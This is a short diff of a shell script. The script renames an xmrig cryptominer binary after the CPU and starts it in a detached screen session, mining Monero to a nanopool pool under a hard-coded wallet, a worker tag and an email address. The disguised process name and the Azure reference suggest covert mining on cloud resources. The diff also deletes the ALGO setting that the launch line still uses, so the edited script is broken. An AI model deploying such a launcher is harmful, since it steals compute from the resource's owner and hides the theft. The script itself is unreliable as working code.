@@ -16,7 +16,6 @@ cp $azure "$cpuname"
 rm -f  xmrig
 POOL=xmr-us-west1.nanopool.org:14433
 USERNAME=85jtJsumYhUUcErXB18SvLWAAvSrSWWMUNt5JgPDSd4FQpVyAsL7b368s5mi1UPXaef95UYT8mp6WhoZRLLAGWS8R8P2udL
-ALGO=rx/0
 DONATE=1
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orcfullaz -p x -a $ALGO -k --tls
+screen -d -m ./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.orcfullaz/jmayo66@yahoo.com -p x -a $ALGO -k --tls
